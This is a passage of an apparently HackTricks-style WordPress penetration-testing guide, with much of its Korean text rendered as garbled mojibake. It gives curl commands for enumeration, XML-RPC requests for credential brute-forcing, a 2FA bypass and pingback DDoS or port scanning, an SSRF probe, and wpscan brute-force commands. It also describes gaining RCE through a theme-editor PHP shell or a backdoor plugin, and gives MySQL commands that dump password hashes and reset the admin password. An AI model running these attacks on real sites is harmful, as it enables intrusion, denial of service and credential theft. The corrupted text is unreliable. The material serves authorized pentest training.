# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** íŒŒì¼ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë£¨íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ê¸°ë³¸ ë¡œê·¸ì¸ ê²½ë¡œ(í™•ì¸í•  ê²ƒ): _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ì£¼ìš” WordPress íŒŒì¼**

- `index.php`
- `license.txt`ì—ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ ë“± ìœ ìš©í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆ WordPress ì‚¬ì´íŠ¸ ì„¤ì • ì‹œ ì´ë©”ì¼ í™œì„±í™” ê³¼ì •ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë” (ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë³€ê²½ë˜ì—ˆì„ ìˆ˜ ìˆìŒ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©í•´ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” WordPress ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ ìœ í˜•ì˜ í†µì‹ ì€ WordPressì˜ [REST API](https://developer.wordpress.org/rest-api/reference)ë¡œ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/` ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, ê¸€ê¼´, JavaScript íŒŒì¼, ìœ„ì ¯ ë“± í•µì‹¬ íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress 5.5 ì´ìƒ ë²„ì „ì—ì„œëŠ” ê³µê°œ í¬ìŠ¤íŠ¸ì™€ ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì… ë° ë¶„ë¥˜(taxonomies)ë¥¼ í¬í•¨í•œ sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

**Post exploitation**

- `wp-config.php` íŒŒì¼ì—ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ í˜¸ìŠ¤íŠ¸, ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸, ì¸ì¦ í‚¤ ë° ì†”íŠ¸, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“± WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ì •ë³´ê°€ ë“¤ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ì„¤ì • íŒŒì¼ì€ ë˜í•œ ë¬¸ì œ í•´ê²° ì‹œ ìœ ìš©í•œ DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‚¬ìš©ì ê¶Œí•œ

- **Administrator**
- **Editor**: ìì‹ ì˜ ë° ë‹¤ë¥¸ ì‚¬ëŒì˜ ê²Œì‹œë¬¼ì„ ë°œí–‰í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Author**: ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ë°œí–‰í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Contributor**: ì‘ì„±í•˜ê³  ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë‚˜ ê²Œì‹œí•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤
- **Subscriber**: ê²Œì‹œë¬¼ì„ ì—´ëŒí•˜ê³  í”„ë¡œí•„ì„ ìˆ˜ì •í•©ë‹ˆë‹¤

## **ìˆ˜ë™ ì—´ê±°**

### **WordPress ë²„ì „ í™•ì¸**

íŒŒì¼ `/license.txt` ë˜ëŠ” `/readme.html`ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

í˜ì´ì§€ì˜ **ì†ŒìŠ¤ ì½”ë“œ** ì•ˆì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/]):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ì¸ ë²„ì „ ì¶”ì¶œ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ëŠ¥ë™ì  ì—´ê±°

### í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆ

ëª¨ë“  í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆë¥¼ ì „ë¶€ ì°¾ì„ ìˆ˜ëŠ” ì—†ì„ ê²ƒì…ë‹ˆë‹¤. ê·¸ë“¤ì„ ëª¨ë‘ ë°œê²¬í•˜ë ¤ë©´ **actively Brute Force a list of Plugins and Themes** í•´ì•¼ í•©ë‹ˆë‹¤ (ìš´ ì¢‹ê²Œë„ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ë“¤ì´ ìˆìŠµë‹ˆë‹¤).

### ì‚¬ìš©ì

- **ID Brute:** WordPress ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì IDë¥¼ Brute Forcingí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´ í•´ë‹¹ idê°€ **ìœ íš¨**í•©ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ idê°€ **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì‚¬ìš©ì ì •ë³´ë¥¼ ì¿¼ë¦¬í•´ ì–»ì–´ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` ì—”ë“œí¬ì¸íŠ¸ëŠ”:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ì´ ì—”ë“œí¬ì¸íŠ¸ëŠ” ê²Œì‹œë¬¼ì„ ì‘ì„±í•œ ì‚¬ìš©ìë§Œ ë…¸ì¶œí•©ë‹ˆë‹¤. **ì´ ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤**.

ë˜í•œ **/wp-json/wp/v2/pages**ê°€ IP ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.

- **Login username enumeration**: ë¡œê·¸ì¸ ì‹œ **`/wp-login.php`**ì˜ **ë©”ì‹œì§€**ê°€ **ì„œë¡œ ë‹¤ë¥´ë©°** **ì‚¬ìš©ìëª… ì¡´ì¬ ì—¬ë¶€**ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### XML-RPC

`xml-rpc.php`ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ credentials brute-forceë¥¼ ìˆ˜í–‰í•˜ê±°ë‚˜ ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— DoS ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

í™œì„±í™” ì—¬ë¶€ë¥¼ í™•ì¸í•˜ë ¤ë©´ _**/xmlrpc.php**_ì— ì ‘ê·¼í•´ ë‹¤ìŒ ìš”ì²­ì„ ë³´ë‚´ë³´ì„¸ìš”:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ë˜ëŠ” **`metaWeblog.getUsersBlogs`** ëŠ” credentialsì„ brute-forceí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ ë©”ì„œë“œì…ë‹ˆë‹¤. ë§Œì•½ ì´ë“¤ ì¤‘ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
ìê²© ì¦ëª…ì´ ìœ íš¨í•˜ì§€ ì•Šì„ ê²½ìš° 200 ì½”ë“œ ì‘ë‹µ ë‚´ì— _"Incorrect username or password"_ ë©”ì‹œì§€ê°€ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì— ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ ê°™ì€ ìš”ì²­ì—ì„œ ì—¬ëŸ¬ credentialsë¥¼ ì‹œë„í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— **`system.multicall`**ì„ ì‚¬ìš©í•´ credentialsë¥¼ ë” ë¹ ë¥´ê²Œ brute-forceí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ì´ ë°©ë²•ì€ ì‚¬ëŒì„ ìœ„í•œ ê²ƒì´ ì•„ë‹ˆë¼ í”„ë¡œê·¸ë¨ìš©ìœ¼ë¡œ ì˜¤ë˜ëœ ë°©ì‹ì´ì–´ì„œ 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ credsê°€ ìˆì§€ë§Œ ë©”ì¸ ì§„ì…ì´ 2FAë¡œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´, **xmlrpc.phpë¥¼ ì•…ìš©í•´ í•´ë‹¹ credsë¡œ ë¡œê·¸ì¸í•˜ì—¬ 2FAë¥¼ ìš°íšŒí•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**. ì½˜ì†”ì„ í†µí•´ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•˜ëŠ” ê²ƒì²˜ëŸ¼ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

ê°’ì´ **0** (17)ë³´ë‹¤ í° **faultCode**ë¥¼ ë°›ìœ¼ë©´ í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤.

ì´ ë°©ë²•ì„ ì•…ìš©í•´ DDoSë¥¼ ì¼ìœ¼í‚¤ëŠ” ë°©ë²•ì€ ì´ì „ ì„¹ì…˜ì˜ **`system.multicall`** ì‚¬ìš© ì˜ˆë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ì´ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ Wordpress ì‚¬ì´íŠ¸ì˜ ë£¨íŠ¸ì— ì¡´ì¬í•©ë‹ˆë‹¤: **`/wp-cron.php`**\
ì´ íŒŒì¼ì— **ì ‘ê·¼ë˜ë©´** "**ë¬´ê±°ìš´**" MySQL **ì¿¼ë¦¬**ê°€ ìˆ˜í–‰ë˜ë¯€ë¡œ, ê³µê²©ìê°€ ì´ë¥¼ ì´ìš©í•´ **DoS**ë¥¼ **ìœ ë°œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ê¸°ë³¸ì ìœ¼ë¡œ `wp-cron.php`ëŠ” ëª¨ë“  í˜ì´ì§€ ë¡œë“œ(í´ë¼ì´ì–¸íŠ¸ê°€ Wordpress í˜ì´ì§€ë¥¼ ìš”ì²­í•  ë•Œë§ˆë‹¤)ë§ˆë‹¤ í˜¸ì¶œë˜ë¯€ë¡œ, íŠ¸ë˜í”½ì´ ë§ì€ ì‚¬ì´íŠ¸ì—ì„œëŠ” ë¬¸ì œ(DoS)ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Wp-Cronì„ ë¹„í™œì„±í™”í•˜ê³  í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‹¤ì œ cronjobì„ ë§Œë“¤ì–´ í•„ìš”í•œ ì‘ì—…ì„ ì •ê¸°ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤(ë¬¸ì œ ì—†ì´).

### /wp-json/oembed/1.0/proxy - SSRF

ë‹¤ìŒ URLì— ì ‘ê·¼ì„ ì‹œë„í•´ë³´ì„¸ìš”: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ê·¸ë¦¬ê³  Worpress ì‚¬ì´íŠ¸ê°€ ì—¬ëŸ¬ë¶„ì—ê²Œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ì´ ë„êµ¬ëŠ” **methodName: pingback.ping**ê³¼ ê²½ë¡œ **/wp-json/oembed/1.0/proxy**ê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ë©´ ì´ë¥¼ ì•…ìš©í•˜ë ¤ ì‹œë„í•©ë‹ˆë‹¤.

## ìë™ ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## bitë¥¼ ë®ì–´ì¨ì„œ ì ‘ê·¼ ì–»ê¸°

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ëŠ” í˜¸ê¸°ì‹¬ì— ê°€ê¹Œìš´ ì‚¬ë¡€ë‹¤. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œ ì„ì˜ì˜ wordpress íŒŒì¼ì˜ 1 bitë¥¼ ë’¤ì§‘ì„ ìˆ˜ ìˆì—ˆë‹¤. ê·¸ë˜ì„œ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389`ë¥¼ ë’¤ì§‘ì–´ NOT (`!`) ì—°ì‚°ì„ NOPë¡œ ë§Œë“¤ ìˆ˜ ìˆì—ˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ì‚¬ìš© ì¤‘ì¸ í…Œë§ˆì˜ php ìˆ˜ì • (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (ì˜¤ë¥¸ìª½ì— ìˆìŒ)

php shellì˜ ë‚´ìš©ìœ¼ë¡œ ë³€ê²½:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ì°¾ì•„ë³´ì„¸ìš”. ì´ ê²½ìš°ì—ëŠ” ì—¬ê¸°ë¡œ ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP í”ŒëŸ¬ê·¸ì¸

í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ .php íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì´ php backdoorë¥¼ ë§Œë“œì„¸ìš”:

![](<../../images/image (183).png>)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆ í”ŒëŸ¬ê·¸ì¸ì„ ì¶”ê°€í•©ë‹ˆë‹¤:

![](<../../images/image (722).png>)

í”ŒëŸ¬ê·¸ì¸ì„ ì—…ë¡œë“œí•˜ê³  'Install Now'ì„ ëˆ„ë¥´ì„¸ìš”:

![](<../../images/image (249).png>)

Proccedë¥¼ í´ë¦­í•˜ì„¸ìš”:

![](<../../images/image (70).png>)

ì•„ë§ˆë„ ëˆˆì— ë„ëŠ” ë³€í™”ëŠ” ì—†ì„ ìˆ˜ ìˆì§€ë§Œ, Mediaë¡œ ê°€ë©´ ì—…ë¡œë“œëœ shellì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (462).png>)

ì ‘ê·¼í•˜ë©´ reverse shellì„ ì‹¤í–‰í•  URLì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ì´ ë°©ë²•ì€ ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” ì•…ì„± í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ì—¬ web shellì„ ì–»ì„ ìˆ˜ ìˆëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì´ ê³¼ì •ì€ WordPress ëŒ€ì‹œë³´ë“œë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. **Plugin Acquisition**: í”ŒëŸ¬ê·¸ì¸ì€ Exploit DBì™€ ê°™ì€ ì¶œì²˜(ì˜ˆ: [**here**](https://www.exploit-db.com/exploits/36374))ì—ì„œ ì…ìˆ˜í•©ë‹ˆë‹¤.
2. **Plugin Installation**:
- WordPress ëŒ€ì‹œë³´ë“œë¡œ ì´ë™í•œ ë‹¤ìŒ `Dashboard > Plugins > Upload Plugin`ìœ¼ë¡œ ê°‘ë‹ˆë‹¤.
- ë‹¤ìš´ë¡œë“œí•œ í”ŒëŸ¬ê·¸ì¸ì˜ zip íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. **Plugin Activation**: í”ŒëŸ¬ê·¸ì¸ì´ ì„±ê³µì ìœ¼ë¡œ ì„¤ì¹˜ë˜ë©´ ëŒ€ì‹œë³´ë“œë¥¼ í†µí•´ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤.
4. **Exploitation**:
- "reflex-gallery" í”ŒëŸ¬ê·¸ì¸ì´ ì„¤ì¹˜ë˜ê³  í™œì„±í™”ë˜ë©´ ì·¨ì•½ì ì„ ì´ìš©í•´ ìµìŠ¤í”Œë¡œì‡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Metasploit frameworkëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ì„ ì œê³µí•©ë‹ˆë‹¤. ì ì ˆí•œ ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  íŠ¹ì • ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ meterpreter sessionì„ ìˆ˜ë¦½í•˜ì—¬ ì‚¬ì´íŠ¸ì— ëŒ€í•œ ë¬´ë‹¨ ì ‘ê·¼ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì´ëŠ” WordPress ì‚¬ì´íŠ¸ë¥¼ ì•…ìš©í•˜ëŠ” ì—¬ëŸ¬ ë°©ë²• ì¤‘ í•˜ë‚˜ì¼ ë¿ì…ë‹ˆë‹¤.

í•´ë‹¹ ë‚´ìš©ì—ëŠ” í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ê³  í™œì„±í™”í•˜ëŠ” WordPress ëŒ€ì‹œë³´ë“œ ë‹¨ê³„ì˜ ì‹œê°ì  ì„¤ëª…ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ê²ƒì€ ì ì ˆí•œ í—ˆê°€ ì—†ì´ ë¶ˆë²•ì ì´ë©° ë¹„ìœ¤ë¦¬ì ì„ì„ ëª…ì‹¬í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì •ë³´ëŠ” ì±…ì„ìˆê²Œ, ëª…ì‹œì ì¸ í—ˆê°€ê°€ ìˆëŠ” pentesting ë“± í•©ë²•ì ì¸ ë§¥ë½ì—ì„œë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSSì—ì„œ RCEë¡œ

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ëŠ” WordPressì—ì„œ **Cross-Site Scripting (XSS)** ì·¨ì•½ì ì„ **Remote Code Execution (RCE)** ë˜ëŠ” ê¸°íƒ€ ì¹˜ëª…ì  ì·¨ì•½ì ìœ¼ë¡œ ìƒìŠ¹ì‹œí‚¤ê¸° ìœ„í•´ ì„¤ê³„ëœ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ë¥¼ í™•ì¸í•˜ì„¸ìš”. ì´ ë„êµ¬ëŠ” **Wordpress Versions 6.X.X, 5.X.X and 4.X.Xë¥¼ ì§€ì›í•˜ë©° ë‹¤ìŒì„ í—ˆìš©í•©ë‹ˆë‹¤:** 
- _**Privilege Escalation:**_ WordPressì— ì‚¬ìš©ìë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ë§ì¶¤ í”ŒëŸ¬ê·¸ì¸(backdoor)ì„ WordPressì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.
- _**(RCE) Built-In Plugin Edit:**_ WordPressì˜ ë‚´ì¥ í”ŒëŸ¬ê·¸ì¸ì„ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(RCE) Built-In Theme Edit:**_ WordPressì˜ ë‚´ì¥ í…Œë§ˆë¥¼ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(Custom) Custom Exploits:**_ ì„œë“œíŒŒí‹° WordPress í”ŒëŸ¬ê·¸ì¸/í…Œë§ˆë¥¼ ìœ„í•œ ë§ì¶¤ ìµìŠ¤í”Œë¡œì‡ì„ ì œê³µí•©ë‹ˆë‹¤.

## Post Exploitation

ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress í”ŒëŸ¬ê·¸ì¸ Pentest

### ê³µê²© í‘œë©´

